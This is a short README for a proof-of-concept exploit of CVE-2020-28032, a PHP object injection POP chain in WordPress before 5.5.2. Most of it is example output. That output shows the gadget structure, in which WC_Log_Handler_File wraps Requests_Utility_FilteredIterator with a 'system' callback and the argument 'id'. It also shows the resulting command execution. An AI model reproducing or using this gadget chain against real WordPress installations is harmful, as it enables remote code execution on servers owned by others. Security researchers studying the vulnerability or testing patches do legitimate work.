# CVE-2020-28032_PoC
PoC for CVE-2020-28032 (It's just a POP chain in WordPress &lt; 5.5.2 for exploiting PHP Object Injection)
## Example output
```
nth347@ubuntu:~$ php CVE-2020-28032_PoC.php 
WC_Log_Handler_File Object
(
    [handles:protected] => Requests_Utility_FilteredIterator Object
        (
            [callback:protected] => system
            [storage:ArrayIterator:private] => Array
                (
                    [0] => id
                )

        )

)
uid=1000(nth347) gid=1000(nth347) groups=1000(nth347),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare)
```
